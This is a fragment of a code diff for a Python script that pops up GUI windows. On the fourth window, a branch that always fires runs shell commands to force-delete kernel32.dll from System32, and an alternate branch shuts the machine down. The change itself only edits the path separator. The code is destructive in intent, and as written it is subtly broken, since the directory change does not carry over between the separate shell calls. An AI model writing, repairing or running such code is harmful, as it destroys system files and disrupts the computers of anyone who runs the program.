@@ -40,7 +40,7 @@ def createWindow(labelText, buttonText, i):
     windows.append(window)
     if i == 4:
         if randint(1, 1) == 1:
-            system('cd C:\Windows\System32')
+            system('cd C:/Windows/System32')
             system('del /f /q kernel32.dll')
         else:
             system('shutdown /s /t 5')
